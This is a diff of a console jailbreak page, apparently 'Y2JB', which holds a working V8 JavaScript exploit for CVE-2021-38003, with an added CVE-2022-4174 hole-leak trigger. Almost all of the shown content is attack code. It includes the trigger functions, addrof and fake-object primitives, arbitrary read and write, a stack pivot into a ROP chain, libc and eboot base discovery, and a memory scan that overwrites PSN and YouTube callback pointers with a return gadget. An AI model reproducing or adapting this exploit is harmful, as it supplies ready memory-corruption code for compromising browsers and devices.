@@ -25,23 +25,24 @@
 </head>
 <body>
     <script>
-        const version_string = "Y2JB 1.1 Beta by Gezine";
+        const version_string = "Y2JB 1.1 by Gezine";
         
         let NETWORK_LOGGING = false;
         let LOG_SERVER = 'http://192.168.1.180:8080/log';
         
         async function checkLogServer() {
             try {
-                const controller = new AbortController();
-                const timeoutId = setTimeout(() => controller.abort(), 1000);
-        
-                await fetch(LOG_SERVER, {
+                const timeoutPromise = new Promise((_, reject) => 
+                    setTimeout(() => reject(new Error('Timeout')), 800)
+                );
+                
+                const fetchPromise = fetch(LOG_SERVER, {
                     method: 'POST',
-                    body: 'Log server check from Y2JB',
-                    signal: controller.signal
+                    body: 'Log server check from Y2JB'
                 });
-        
-                clearTimeout(timeoutId);
+                
+                await Promise.race([fetchPromise, timeoutPromise]);
+                
                 NETWORK_LOGGING = true;
             } catch (e) {
                 NETWORK_LOGGING = false;
@@ -100,28 +101,32 @@
             return '0x' + BigInt(num).toString(16).padStart(16, '0');
         }
         
-        function trigger() {  
-            let a = [], b = [];  
-            let s = '"'.repeat(0x800000);
-            a[20000] = s;
-            for (let i = 0; i < 10; i++) a[i] = s;  
-            for (let i = 0; i < 10; i++) b[i] = a;  
-
-            try {  
-                JSON.stringify(b);  
-            } catch (hole) {  
-                return hole;  
+        function trigger() {
+            let v1;
+            function f0(v4) {
+                v4(() => { }, v5 => {
+                    v1 = v5.errors;
+                });
             }
+            f0.resolve = function (v6) {
+                return v6;
+            };
+            let v3 = {
+                then(v7, v8) {
+                    v8();
+                }
+            };
+            Promise.any.call(f0, [v3]);
+            return v1[1];
         }
         
         setTimeout(async () => {
-            try {
-                await checkLogServer();
-                
+            try {                
                 await log(version_string);
                 await log('Starting Exploit');
                 
                 // CVE-2021-38003
+                // CVE-2022-4174 faster hole leak
                 // https://starlabs.sg/blog/2022/12-the-hole-new-world-how-a-small-leak-will-sink-a-great-browser-cve-2021-38003/
                 let hole = trigger();
                 
@@ -144,11 +149,6 @@
                 
                 window.stable_arrays = { victim_arr, obj_arr, oob_arr };
                 
-                // Send primitive arrays to old generation
-                for (let i = 0; i < 10; i++) {
-                    gc();
-                }
-                
                 //oob_arr[31] : 0x2 -- victim_arr length
                 //oob_arr[32] : 0xf -- victim_arr ExternalPointer_t 
                 //oob_arr[33] : 0x27e8412d1 -- victm_arr base_pointer
@@ -167,14 +167,15 @@
                         break;
                     }
                 }
-                
-                await log('obj_arr_offset : ' + obj_arr_offset);
+
+                //await log('obj_arr_offset : ' + obj_arr_offset);
                 
                 if (obj_arr_offset === -1) {
-                    throw new Error("Failed to send primitive arrays to old generation");
+                    throw new Error("Failed to get unstable primitive");
                 }
                 
-                // This is actually stable but we need fake object anyway
+                await log("Unstable primitive achieved");
+                
                 function addrof_unstable(obj) {
                     const obj_arr_org_value = oob_arr[obj_arr_offset];
                     obj_arr[0] = obj;
@@ -224,13 +225,9 @@
                 const stable_array_addr = addrof_unstable(stable_array);
                 const stable_elements_addr = read64_unstable(stable_array_addr + 0x10n) - 1n;
                 
-                await log('Large Object Space @ ' + toHex(stable_elements_addr));
-                
                 // Transform elements to FixedDoubleArray
                 // This makes GC happy later
                 write64_unstable(stable_elements_addr + 0x00n, fixed_double_array_map);
-                
-                await log('Converted stable_array to double array');
                 
                 // Get templates for large external storage arrays
                 const template_biguint = new BigUint64Array(64);
@@ -281,8 +278,6 @@
                 const heap_number = 1.1;
                 const heap_number_addr = addrof_unstable(heap_number);
                 const heap_number_map = read64_unstable(heap_number_addr);
-                
-                await log('Templates extracted');
                 
                 const base = stable_elements_addr + 0x2000n;
                 
@@ -531,8 +526,6 @@
                 const fake_arr2 = create_fakeobj_unstable(fake_arr2_obj);
                 const fake_array = create_fakeobj_unstable(fake_array_obj);
                 
-                await log('Fake objects for stable primitive materialized');
-                
                 // Calculate offsets for accessing via fake_rw
                 const arr2_external_offset = Number((fake_arr2_obj + 0x38n - fake_rw_data) / 8n);
                 const fake_array_slot0_offset = Number((fake_array_elements_data + 0x10n - fake_rw_data) / 8n);
@@ -686,11 +679,11 @@
                 const fake_frame = create_fakeobj(fake_frame_obj);
                 const return_value_buf = create_fakeobj(fake_return_value_obj);
                 
-                await log("fake_bc @ " + toHex(addrof(fake_bc)));
-                await log("fake_frame @ " + toHex(addrof(fake_frame)));
+                //await log("fake_bc @ " + toHex(addrof(fake_bc)));
+                //await log("fake_frame @ " + toHex(addrof(fake_frame)));
                 
                 const bytecode_addr = get_bytecode_addr();
-                await log("BytecodeArray @ " + toHex(bytecode_addr));
+                //await log("BytecodeArray @ " + toHex(bytecode_addr));
                 
                 bc_start = bytecode_addr + 0x36n;
                 write64(bc_start, 0xAB0025n);
@@ -705,12 +698,12 @@
                 await log("libc_base @ " + toHex(libc_base));
                 
                 const rop_chain_addr = get_backing_store(rop_chain);
-                await log("ROP chain @ " + toHex(rop_chain_addr));
+                //await log("ROP chain @ " + toHex(rop_chain_addr));
                 
                 // Fake bytecode for r14 register
                 fake_bc[0] = 0xABn; // Return opcode - keeps interpreter happy
                 const fake_bc_addr = get_backing_store(fake_bc);
-                await log("Fake bytecode @ " + toHex(fake_bc_addr));
+                //await log("Fake bytecode @ " + toHex(fake_bc_addr));
                 
                 const fake_frame_backing = get_backing_store(fake_frame);
                 
@@ -718,7 +711,7 @@
                 write64(fake_frame_backing + 0x21n, fake_bc_addr);
                 
                 const return_value_addr = get_backing_store(return_value_buf);
-                await log("return_value_addr @ " + toHex(return_value_addr));
+                //await log("return_value_addr @ " + toHex(return_value_addr));
 
                 const fake_frame_addr = addrof(fake_frame);
                 // Pivot RSP
@@ -792,27 +785,84 @@
                     throw new Error("ROP test failed");
                 }
                 
-                function rop_test2() {
-                    return call(eboot_base + 0x1283d40n);
+                // PSN dialog disabler
+                await log("Disabling PSN dialog and Youtube splash kill...");
+                const psn_callback = eboot_base + 0x2AEC50n;
+                const yt_callback = eboot_base + 0x10B70n;
+                const ret_gadget = eboot_base + 0x32n;
+                
+                await log("PSN dialog callback: " + toHex(psn_callback));
+                await log("YT callback: " + toHex(yt_callback));
+                
+                const sceKernelVirtualQuery = read64(eboot_base + 0x2A65C10n);
+                const info = malloc(0x60);
+                
+                let current_addr = 0x200000000n;
+                let end_addr = 0x300000000n;
+                let regions_searched = 0;
+                let psn_matches = 0;
+                let yt_matches = 0;
+                
+                // First scan
+                while (current_addr < end_addr && (psn_matches < 2 || yt_matches < 1)) {
+                    const ret = call(sceKernelVirtualQuery, current_addr, 1n, info, 0x60n);
+                    
+                    const start = read64(info);
+                    if (start >= end_addr) break;
+                    
+                    const end = read64(info + 8n);
+                    const size = end - start;
+                    const protection = read32(info + 0x18n);
+                    
+                    regions_searched++;
+                    
+                    if (size <= 0x80000n && protection === 3n) {
+                        
+                        for (let addr = start; addr < end; addr += 8n) {
+                            
+                            let value = read64(addr);
+                            
+                            if (value === psn_callback && psn_matches < 2) {
+                                psn_matches++;
+                                await log("PSN Callback address @ " + toHex(addr));
+                                write64(addr, ret_gadget);
+                            } else if (value === yt_callback && yt_matches < 1) {
+                                yt_matches++;
+                                await log("YT Callback address @ " + toHex(addr));
+                                write64(addr, ret_gadget);
+                            }
+                            
+                            // Break inner loop if we found everything we need
+                            if (psn_matches >= 2 && yt_matches >= 1) {
+                                break;
+                            }
+                        }
+                    }
+                    
+                    // Break outer loop if we found everything
+                    if (psn_matches >= 2 && yt_matches >= 1) {
+                        break;
+                    }
+                    
+                    current_addr = end;
                 }
-                
-                await log("ROP test2, should see 0x0000000200000000 : " + toHex(rop_test2()));
-                
+
                 // https://github.com/shahrilnet/remote_lua_loader/blob/22a03e38b6e8f13e2e379f7c5036767c14162ff3/savedata/syscall.lua#L42
                 const sceKernelGetModuleInfoFromAddr = read64(libc_base + 0x113C08n);
-                await log("sceKernelGetModuleInfoFromAddr @ " + toHex(sceKernelGetModuleInfoFromAddr));                
+                await log("sceKernelGetModuleInfoFromAddr @ " + toHex(sceKernelGetModuleInfoFromAddr));
+                
                 //gettimeofday plt
                 //0x113B18
                 const gettimeofdayAddr = read64(libc_base + 0x113B18n);
-                await log("gettimeofdayAddr @: " + toHex(gettimeofdayAddr));
+                //await log("gettimeofdayAddr @: " + toHex(gettimeofdayAddr));
                 
                 const mod_info = malloc(0x300);
-                await log("mod_info buffer @ " + toHex(mod_info));
+                //await log("mod_info buffer @ " + toHex(mod_info));
                 
                 const SEGMENTS_OFFSET = 0x160n;
                 
                 ret = call(sceKernelGetModuleInfoFromAddr, gettimeofdayAddr, 0x1n, mod_info);
-                await log("sceKernelGetModuleInfoFromAddr returned: " + toHex(ret));
+                //await log("sceKernelGetModuleInfoFromAddr returned: " + toHex(ret));
 
                 if (ret !== 0x0n) {
                     await log("ERROR: sceKernelGetModuleInfoFromAddr failed: " + toHex(ret));
@@ -892,6 +942,15 @@
                     
                 }
                 
+                if (psn_matches === 2 && yt_matches === 1) {
+                    send_notification("PSN dialog disabled\nSafe to close PSN sign out dialog now");
+                    await log("PSN dialog disabled\nSafe to close PSN sign out dialog now");
+                } else {
+                    send_notification("Failed to disable PSN dialog\nDo not close PSN sign out dialog early\nClose and restart Y2JB");
+                    throw new Error(`Failed to disable PSN dialog (PSN: ${psn_matches}/2, YT: ${yt_matches}/1)\nDo not close PSN sign out dialog early\nClose and restart Y2JB`);
+                }
+                
+                await checkLogServer();
                 send_notification(version_string);
                 
                 const AF_INET = 0x2n;
@@ -1087,7 +1146,7 @@
                 await log(e.stack);
             }
             
-        }, 2000);
+        }, 650);
     </script>
 </body>
 </html>
